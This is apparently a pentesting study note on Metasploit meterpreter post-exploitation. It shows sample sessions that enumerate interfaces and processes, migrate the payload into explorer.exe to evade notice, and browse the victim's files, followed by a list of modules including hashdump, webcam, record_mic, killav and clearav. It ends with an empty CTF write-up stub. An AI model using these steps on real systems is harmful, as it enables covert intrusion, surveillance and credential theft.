# POST EXPLOITATION
> Refers to any actions taken after a sestion is opened.

Session is an open shell from a successful exploit or bruteforce attack and a shell can be a standard shell or meterpreter.

This phase deals with collecting sensitive information, documenting it, and having an idea of the configuration settings, network interfaces, and other communication channels.

Examples of post-exploitation:

  1. Collect sensitive files.
  2. Add username and password to gain easy access.
  3. Persistant shell.
  4. Elevate privileges.
  5. Jump to different VLAN.
  6. Collect hashes and crack them.
  
These may be used to maintain persistent access to the system.

### Network information.
This will get some information about the victim connection type or to the networks connected to any of the compromised machine interfaces.
```
meterpreter > ipconfig 

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 11
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:ea:a6:49
MTU          : 1500
IPv4 Address : 192.168.0.118
IPv4 Netmask : 255.255.255.0
IPv6 Address : 2001:8f8:1425:5d4a:adf5:4a0c:b11f:db2
IPv6 Netmask : ffff:ffff:ffff:ffff::
IPv6 Address : 2001:8f8:1425:5d4a:99dc:a85:87d5:437d
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
IPv6 Address : fe80::adf5:4a0c:b11f:db2
IPv6 Netmask : ffff:ffff:ffff:ffff::
```
as from the above, we can easily tell that the user is part of the 192.168.0.0/24 subnet and has only 1 NIC.

### Process impersonation
Metasploit meterpreter can change the process ID of the malware software to take another Windows process ID making it difficult for someone who looks at the windows running processes.

to list all running processes in the target computer, type **ps** command.
```
meterpreter > ps
                                                                               
Process List                                                                       
============                                                                            
                                                                                             
 PID   PPID  Name               Arch  Session  User                          Path                        
 ---   ----  ----               ----  -------  ----                          ----                               
 0     0     [System Process]                                                
 4     0     System             x64   0                                      
 248   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 280   480   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 328   312   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 380   312   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 388   372   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 424   372   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 480   380   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 492   380   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 500   380   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 588   480   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 648   480   VBoxService.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VBoxService.exe
 704   480   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  
 804   480   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 848   480   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 876   480   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 952   480   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  
 1100  848   dwm.exe            x64   1        admin-PC\admin                C:\Windows\system32\Dwm.exe
 1144  480   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1172  480   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 1260  480   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 1680  1772  VBoxTray.exe       x64   1        admin-PC\admin                C:\Windows\System32\VBoxTray.exe
 1772  1708  explorer.exe       x64   1        admin-PC\admin                C:\Windows\Explorer.EXE
 1900  480   taskhost.exe       x64   1        admin-PC\admin                C:\Windows\system32\taskhost.exe
 1952  480   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM           
 2004  480   sppsvc.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  
 2120  480   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
```
The windows explorer process ID is _1772_, we can migrate our payload to use _explorer.exe_ process number 1772 to be less suspicious to the victim machine using migrate command.
```
meterpreter > migrate 1772
[*] Migrating from 1144 to 1772...
[*] Migration completed successfully.
```

### Exploring victim file system.
Run the following commands to see who the users are
```
meterpreter > cd Users 
meterpreter > ls
Listing: c:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  All Users
40555/r-xr-xr-x   8192  dir   2009-07-13 23:20:08 -0400  Default
40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  Default User
40555/r-xr-xr-x   4096  dir   2009-07-13 23:20:08 -0400  Public
40777/rwxrwxrwx   8192  dir   2021-02-24 02:04:38 -0500  admin
100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini
```

Run the following command to see the file system being used.
```
meterpreter > cd c:/
meterpreter > dir
Listing: c:\
============

Mode             Size     Type  Last modified              Name
----             ----     ----  -------------              ----
40777/rwxrwxrwx  0        dir   2009-07-13 23:18:56 -0400  $Recycle.Bin
40777/rwxrwxrwx  0        dir   2009-07-14 01:08:56 -0400  Documents and Settings
40777/rwxrwxrwx  0        dir   2009-07-13 23:20:08 -0400  PerfLogs
40555/r-xr-xr-x  4096     dir   2009-07-13 23:20:08 -0400  Program Files
40555/r-xr-xr-x  4096     dir   2009-07-13 23:20:08 -0400  Program Files (x86)
40777/rwxrwxrwx  4096     dir   2009-07-13 23:20:08 -0400  ProgramData
40777/rwxrwxrwx  0        dir   2021-02-24 02:04:34 -0500  Recovery
40777/rwxrwxrwx  4096     dir   2021-02-23 22:32:55 -0500  System Volume Information
40555/r-xr-xr-x  4096     dir   2009-07-13 23:20:08 -0400  Users
40777/rwxrwxrwx  16384    dir   2009-07-13 23:20:08 -0400  Windows
0000/---------   3093568  fif   1973-02-15 21:10:40 -0500  pagefile.sys
```

Metasploit includes many post-exploitation module to simplify this process.

  1. getuid - obtain uid information.
  2. sysinfo - obtain information about the system.
  3. migrate - move to another stable process.
  4. ps - list running process.
  5. getsystem - used for privilege escalation.
  6. upload
  7. download
  8. screenshot
  9. hashDump
  10. record_mic
  11. webcam
  12. sniffer
  13. enable_rdp
  14. killav
  15. clearav
  
---------------------------
# writeup

###### Challenge Name : **Remote**

Challenge Category : Machines

Challenge Level : Medium

Challenge Description : Get The highest privilege on the machine and find the flag!

Target IP1: 3.127.135.236

Target IP2: 3.127.108.62

**Solution**

> flag : 
